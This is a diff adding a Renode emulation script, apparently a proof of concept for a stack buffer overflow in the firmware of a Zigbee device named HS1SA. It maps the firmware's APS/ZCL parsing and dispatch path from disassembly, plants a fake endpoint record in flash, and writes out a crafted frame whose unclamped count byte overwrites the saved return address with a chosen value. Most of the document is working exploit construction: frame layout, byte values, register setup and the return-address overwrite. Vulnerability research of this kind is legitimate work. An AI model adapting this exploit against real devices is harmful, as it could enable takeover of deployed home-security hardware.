@@ -1,0 +1,124 @@
+:name: ZB-06 HS1SA — APS ENDPOINT/CLUSTER-AFFINITY ROUTING reachability PoC (sub_E376 -> SINK)
+:description: Enters the firmware's APS-layer plaintext parser sub_E376 (0xE376) with a crafted 0xC801-addressed frame AND installs one matching endpoint record in the (normally runtime-populated) endpoint-affinity table at flash 0x000396D4, so sub_E376's OWN endpoint/cluster/profile search (0xe4c6-0xe502) MATCHES and dispatches the frame to the ZCL command dispatcher sub_7D46 -> gate sub_a33c -> sink sub_1662e, all by the firmware's own branches/calls. This crosses ONE more layer than zb06_dispatch_inject.resc: the APS endpoint affinity routing INSIDE sub_E376.
+#
+# ============================ FIELD MAPPING (disasm-cited, sub_E376) ============================
+#   0xC801 addressing branch (frame[0..1] & 0xFFDF == 0xC801, e39a-e3ae): ZCL/APS data at frame+7.
+#   ZCL offset r4 resolves to 0x1a (bit5 of frame[0x13] clear -> e442 bpl e458 -> r4 = 0x1a).
+#   Search-loop compare operands (0xe4e2-0xe4fa):
+#     record[0..1] (cluster)  == [sp+0x16] = frame[0x18..0x19]   (e43a-e43e store; e4e2 cmp)
+#     record[2..3] (profile)  == [sp+0x18] = frame[0x16..0x17]   (e432 store;      e4ee cmp)
+#     record[4]    (endpoint) == r7        = frame[0x1e]         (e4b4, bit2 of frame[0x1a]=FC set)
+#     record[5]    (flags)    & r2         must be != 0; r2 = 9  (e490-e4aa, from FC=0x05 bits)
+#     record[0..1] == 0xFFFF  => terminator/UNDISPATCHED (e4de-e4e0; r3 held 0xFFFF)
+#   NOTE frame[0x1e] serves BOTH as E376's endpoint byte AND as the ZCL cmdId (=0xF3) because
+#   FC(frame[0x1a])=0x05 has bit2 set, so E376 reads endpoint from frame[r4+4]=frame[0x1e].
+#   Hence the installed record's endpoint byte is 0xF3 (a consequence of the frame layout).
+#
+#   INSTALLED 6-BYTE RECORD @0x000396D4:
+#     cluster=0x0104  profile=0x0000  endpoint=0xF3  flags=0xFF
+#     bytes: 04 01 00 00 F3 FF
+#
+#   Gate sub_a33c requires r3==0x120B (mfgCode, from payload) && r1==0 (=struct[2]=profile) &&
+#   r2==0xF3 (cmdId, from payload). profile==0 satisfies BOTH the search (record[2..3]=0) and
+#   the gate (struct[2]=0). mfgCode/cmdId come from the ZCL command bytes at frame+0x1a.
+# =================================================================================================
+#
+# ============================ FORCED vs NATURAL ============================
+#   FORCED (emulation scaffolding):
+#     (a) One 6-byte endpoint record is written into the flash affinity table @0x396D4. The
+#         table is EMPTY in the static image (first record = 0xFFFF terminator) because endpoints
+#         are registered at RUNTIME by the Zigbee stack, which we do NOT run. Installing the record
+#         SUBSTITUTES for that runtime endpoint registration; a real joined HS1SA HAS registered
+#         endpoints, so this models a real device's post-join state, not an artificial code bypass.
+#     (b) The plaintext frame is injected at sub_E376 (bypasses only NWK/APS crypto+membership).
+#   NATURAL (firmware's own execution, NO forced PC after entry at 0xE376):
+#     sub_E376 parses the APS/ZCL fields, runs its OWN endpoint/cluster/profile search, MATCHES the
+#     installed record, builds the dispatch struct, and CALLS sub_7D46 (0xe58e). Then sub_7cc0 parses
+#     the ZCL header, sub_7B5A reads the context and CALLS the gate sub_a33c, which matches
+#     mfg=0x120B/dir=0/cmd=0xF3 and TAIL-CALLS the sink sub_1662e, whose unclamped count byte
+#     (payload[0x0a]=0x28=40) overflows the stack buffer and overwrites the saved LR.
+# =================================================================================================
+
+include @scripts/silabs-vuln/hs1sa.resc
+logLevel 3
+logLevel 3 sysbus.radio
+
+# COLD hooks (each fires once on this path).
+cpu AddHook 0xe504  "self.ErrorLog('MARK_E504_SEARCH_MATCH')"
+cpu AddHook 0xe58e  "self.ErrorLog('MARK_E58E_DISPATCH_CALL')"
+cpu AddHook 0xe5ac  "self.ErrorLog('MARK_E5AC_UNDISPATCHED')"
+cpu AddHook 0x7d46  "self.ErrorLog('MARK_7D46_ZCLDISP')"
+cpu AddHook 0xa33c  "self.ErrorLog('MARK_A33C_GATE')"
+cpu AddHook 0x1662e "self.ErrorLog('MARK_1662E_SINK')"
+
+# At the sink's return (pop pc, 0x16736) the buffer overflow is complete: HALT so the run
+# stops cleanly before the corrupted PC sends the CPU into the weeds; the saved-LR slot is
+# then read below by the monitor. (Reaching 0x16736 already proves the sink ran to completion.)
+set sink_ret_halt """
+self.ErrorLog('MARK_16736_SINK_RET (overflow complete, halting)')
+self.IsHalted = True
+"""
+cpu AddHook 0x16736 $sink_ret_halt
+
+# Boot through clock/power/radio bring-up (verify PC advances, not stuck @0x266A4).
+emulation RunFor "0.05"
+pause
+echo ">>> post-boot PC (expect advanced):"
+cpu PC
+
+# --- Install ONE matching endpoint record in the flash affinity table @0x000396D4 -------------
+# (substitutes for runtime endpoint registration; see FORCED vs NATURAL above)
+echo ">>> flash affinity table @0x396D4 BEFORE install (expect FFFF terminator):"
+sysbus ReadDoubleWord 0x000396D4
+sysbus WriteWord 0x000396D4 0x0104
+sysbus WriteWord 0x000396D6 0x0000
+sysbus WriteByte 0x000396D8 0xF3
+sysbus WriteByte 0x000396D9 0xFF
+sysbus WriteWord 0x000396DA 0xFFFF
+echo ">>> flash affinity table @0x396D4 AFTER install (expect 0x00000104 then 0xFFF30000):"
+sysbus ReadDoubleWord 0x000396D4
+sysbus ReadDoubleWord 0x000396D8
+
+# --- Craft the plaintext 0xC801-addressed frame in scratch RAM (frame base = 0x20008001) -------
+python "for a in range(0x20008000,0x20008080,4): monitor.Machine.SystemBus.WriteDoubleWord(a,0)"
+# APS FC halfword: frame[0]=0x01, frame[1]=0xC8 -> (0xC8<<8|0x01)&0xFFDF == 0xC801
+sysbus WriteDoubleWord 0x20008000 0x00C80100
+# frame[0x11..0x12] = 0x000B  (APS check e3ee)
+sysbus WriteDoubleWord 0x20008010 0x000B0000
+# frame[0x13]=0x0F ((&~0x2C)==3 && (&0xC)==0xC, bit5 clear); frame[0x16]=0 (profile lo)
+sysbus WriteDoubleWord 0x20008014 0x0000000F
+# frame[0x17]=0(profile hi), frame[0x18..19]=0x0104(cluster), frame[0x1a]=0x05(ZCL FC)
+sysbus WriteDoubleWord 0x20008018 0x05010400
+# frame[0x1b..1c]=mfgCode 0x120B, frame[0x1d]=TSN 0x00, frame[0x1e]=cmdId/endpoint 0xF3
+sysbus WriteDoubleWord 0x2000801C 0xF300120B
+# --- Sink command body (sink r0 = payload+hdr(5) = frame+0x1a+5 = 0x20008020) -----------------
+#   [r0+0x08]=0x01 (outer segment count <5)  [r0+0x0a]=0x28=40 (UNCLAMPED count)
+#   records 34/35 assemble the saved-LR sentinel 0x20006E01
+sysbus WriteDoubleWord 0x20008028 0x41280001
+sysbus WriteDoubleWord 0x2000806C 0x6E414141
+sysbus WriteDoubleWord 0x20008070 0x41002001
+
+# --- Pre-place saved-LR sentinel where the SINK's saved LR lands for entry at 0xE376 -----------
+# entry_SP=0x20010000; E376 frame 0x48, 7D46 0x30, 7B5A 0x18 => sink entry SP=0x2000FF70,
+# saved LR @ 0x2000FF6C; sink buffer[34] (SP_int+0x18+0x44) coincides with that slot.
+sysbus WriteDoubleWord 0x2000FF6C 0xAABBCCDD
+echo ">>> BEFORE: saved-LR slot @0x2000FF6C (sentinel) ="
+sysbus ReadDoubleWord 0x2000FF6C
+
+# --- Register contract for sub_E376(r0=dequeue_len, r1=frame_ptr) (sub_C22C call site) ---------
+sysbus.cpu SetRegister 0  0x0000007A
+sysbus.cpu SetRegister 1  0x20008001
+sysbus.cpu SetRegister 13 0x20010000
+sysbus.cpu SetRegister 14 0x0000DEAD
+sysbus.cpu PC 0xE376
+
+# Let the firmware's OWN parse+search+dispatch+gate+sink run (bounded window).
+emulation RunFor "0.002"
+pause
+
+echo ">>> AFTER: PC ="
+cpu PC
+echo ">>> AFTER: saved-LR slot @0x2000FF6C (expect 0x20006E01) ="
+sysbus ReadDoubleWord 0x2000FF6C
+echo ">>> (marker order expected: E504_SEARCH_MATCH -> E58E_DISPATCH_CALL -> 7D46 -> A33C_GATE -> 1662E_SINK)"
+quit
